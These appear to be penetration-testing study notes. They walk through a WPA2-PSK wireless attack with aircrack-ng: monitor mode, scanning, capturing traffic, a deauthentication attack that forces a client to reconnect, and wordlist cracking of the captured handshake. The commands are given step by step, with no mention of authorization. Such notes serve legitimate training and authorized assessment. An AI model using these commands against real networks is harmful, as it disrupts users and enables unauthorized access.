# Wireless Attacks

The two common types of assessments of wireless networks is:

- WPA2 PSK
- WPA2 Enterprise

You need a wireless card to perform this assessment.

- Hacking Process (WPA2 PSK)
    - Place wireless card into monitor mode
    - Discover information about network
    - Select network and capture data
    - Perform deauth attack
    - Capture WPA handshake
    - Attempt to crack the handshake

*The attack of wireless networks relies on poor password implementation*

Step 1: 

```jsx
airmon-ng check kill
```

This kills the process that might interfere with the monitor

Step 2:

```jsx
airmon-ng start wlan0
```

This starts monitor mode

Step 3:

```jsx
airodump-ng wlan0mon
```

This will populate all the devices around us in our location

Step 4:

```jsx
airodump-ng -c 6 --bssid MAC ADDRESS -w capture wlan0mon
```

We can kick a client off the network and require them to do the handshake again to capture the handshake, this will create a capture file where we can attempt to crack the handshake

Step 5: 

```jsx
aireplay-ng -0 1 -a MACADDRESS -c CLIENTMAC wlan0mon
```

This command will deauth the user and require a handshake

Step 6: View capture files

Step 7: Run Aircrack-ng

```jsx
aircrack-ng -w wordlist.txt -b APMACADDRESS CAPTUREFILE
```